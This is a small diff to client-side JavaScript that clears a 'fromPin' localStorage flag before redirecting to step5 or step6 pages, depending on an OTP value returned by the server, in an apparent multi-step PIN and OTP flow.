@@ -50,12 +50,14 @@ if (localStorage.getItem("fromPin") === "yes") {
 
         // 🔥 FORCE CHECK (handles string + number)
         if (data.otp == 5) {
-            window.location.href = "step5.html";
-        }
+    localStorage.removeItem("fromPin");
+    window.location.href = "step5.html";
+}
 
         if (data.otp == 6) {
-            window.location.href = "step6.html";
-        }
+    localStorage.removeItem("fromPin");
+    window.location.href = "step6.html";
+}
 
         const decisionRes = await fetch("/decision-status");
         const decisionData = await decisionRes.json();
